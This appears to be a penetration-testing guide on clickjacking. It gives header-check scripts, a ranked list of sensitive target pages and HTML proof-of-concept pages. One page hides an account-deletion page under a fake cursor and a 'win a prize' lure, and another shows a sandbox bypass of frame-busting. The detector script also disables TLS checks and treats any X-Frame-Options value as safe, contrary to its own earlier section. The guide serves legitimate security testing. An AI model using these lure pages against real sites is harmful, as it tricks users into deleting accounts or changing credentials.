# Clickjacking Testing

## Objective

Identify pages that can be embedded in a cross-origin `<iframe>`, enabling an attacker to overlay transparent or opaque layers over legitimate UI elements and trick users into performing unintended actions (e.g., changing passwords, confirming payments, enabling features).

---

## 1. X-Frame-Options & CSP Frame Detection

```bash
# Check for frame protection headers
curl -si https://target/ | grep -iE "x-frame-options|content-security-policy"

# Check on specific sensitive pages
PAGES=(
  "/"
  "/login"
  "/dashboard"
  "/account/settings"
  "/account/change-password"
  "/account/delete"
  "/payment/confirm"
  "/admin"
)

for PAGE in "${PAGES[@]}"; do
  echo "=== $PAGE ==="
  curl -si "https://target$PAGE" \
    -H "Cookie: session=USER_TOKEN" | grep -iE "x-frame-options|frame-ancestors"
  echo ""
done
```

**Protected if:**
- `X-Frame-Options: DENY` — cannot be framed at all
- `X-Frame-Options: SAMEORIGIN` — can only be framed by same origin
- `Content-Security-Policy: frame-ancestors 'none'` — modern equivalent of DENY
- `Content-Security-Policy: frame-ancestors 'self'` — modern SAMEORIGIN

**Vulnerable if:**
- Neither header is present
- `X-Frame-Options: ALLOWALL`
- CSP has permissive `frame-ancestors *` or is absent

---

## 2. Basic Clickjacking PoC

```html
<!-- clickjacking_poc.html -->
<!-- Test: can the target page be loaded in an iframe from a different origin? -->
<html>
<head>
  <style>
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0.1;     /* Semi-transparent to confirm content loaded */
      z-index: 2;
    }
    .overlay {
      position: absolute;
      top: 200px;
      left: 300px;
      z-index: 1;
      background: red;
      padding: 15px;
      font-size: 18px;
      color: white;
    }
  </style>
</head>
<body>
  <div class="overlay">Click the button below!</div>
  <iframe src="https://TARGET/account/change-password"
          sandbox="allow-forms allow-scripts allow-same-origin">
  </iframe>
  <p>If the target page loads inside this frame = Clickjacking confirmed</p>
</body>
</html>
```

Open this HTML file in a browser to verify if the target page loads in the iframe.

---

## 3. Frame Detection Script

```bash
# Automated check for all critical pages
python3 << 'EOF'
import urllib.request
import ssl

TARGET = "https://target.com"
PAGES = [
    "/",
    "/login",
    "/dashboard",
    "/account/settings",
    "/account/change-password",
    "/payment/confirm",
    "/admin",
]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

print(f"{'Page':<35} {'X-Frame-Options':<25} {'CSP frame-ancestors'}")
print("-" * 80)

for page in PAGES:
    url = TARGET + page
    try:
        req = urllib.request.Request(url)
        req.add_header('Cookie', 'session=USER_TOKEN')
        resp = urllib.request.urlopen(req, context=ctx, timeout=5)
        headers = dict(resp.headers)

        xfo = headers.get('X-Frame-Options', 'MISSING')
        csp = headers.get('Content-Security-Policy', '')
        fa = 'MISSING'
        if 'frame-ancestors' in csp:
            fa = [d for d in csp.split(';') if 'frame-ancestors' in d][0].strip()

        vulnerable = "✓ PROTECTED" if xfo != 'MISSING' or fa != 'MISSING' else "✗ VULNERABLE"
        print(f"{page:<35} {xfo:<25} {fa:<30} {vulnerable}")
    except Exception as e:
        print(f"{page:<35} Error: {e}")
EOF
```

---

## 4. High-Impact Clickjacking Targets

Prioritize testing these pages (high business impact if clickjackable):

| Page | Clickjacking Impact |
|---|---|
| `/account/change-password` | Account takeover |
| `/account/change-email` | Account takeover |
| `/account/delete` | Account loss |
| `/settings/2fa/disable` | MFA removal |
| `/payment/confirm` | Financial transaction |
| `/settings/connect-app` | OAuth linking |
| `/admin/users/{id}/delete` | Admin data loss |
| `/api-keys/create` | Credential exposure |

---

## 5. Cursorjacking / UI Redressing Test

Beyond basic clickjacking, test:

```html
<!-- Cursor redressing — fake cursor placed offset from real cursor -->
<html>
<style>
  * { cursor: none !important; }
  .fake-cursor {
    position: fixed;
    width: 12px;
    height: 18px;
    background: url('cursor.png');
    pointer-events: none;
    z-index: 99999;
  }
  iframe {
    transform: translate(-200px, -150px);
    opacity: 0.01;
    position: absolute;
  }
</style>
<body>
  <div class="fake-cursor" id="cursor"></div>
  <div style="position:absolute;top:300px;left:400px;font-size:24px">
    CLICK HERE TO WIN A PRIZE!
  </div>
  <iframe src="https://TARGET/account/delete?confirm=true"
          width="1000" height="800">
  </iframe>
  <script>
    document.addEventListener('mousemove', function(e) {
      document.getElementById('cursor').style.left = e.clientX + 'px';
      document.getElementById('cursor').style.top = e.clientY + 'px';
    });
  </script>
</body>
</html>
```

---

## 6. Frame Busting Script Bypass

Some sites use JavaScript frame-busting instead of headers:

```javascript
// Common frame-busting code (INSECURE — can be bypassed)
if (top !== self) { top.location = self.location; }
```

**Bypass via sandbox attribute:**
```html
<!-- sandbox="allow-forms" prevents frame-busting JS from running -->
<iframe src="https://TARGET/sensitive-page"
        sandbox="allow-forms">
</iframe>
```

Test:
```html
<iframe src="https://TARGET/account/change-password"
        sandbox="allow-forms allow-scripts allow-same-origin">
</iframe>
```

If the page loads but JS frame-buster is blocked by sandbox → still vulnerable.

---

## Evidence to Capture

- Screenshot of PoC HTML showing the target page loaded within the iframe
- HTTP response showing absence of `X-Frame-Options` or `CSP: frame-ancestors`
- List of all vulnerable sensitive pages found

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Sensitive action page frameable | Pass/Fail | Medium-High |
| Login page frameable | Pass/Fail | Medium |
| Admin page frameable | Pass/Fail | High |
| Frame-busting JS bypassable via sandbox | Pass/Fail | Medium |
| No X-Frame-Options on any page | Pass/Fail | Medium |
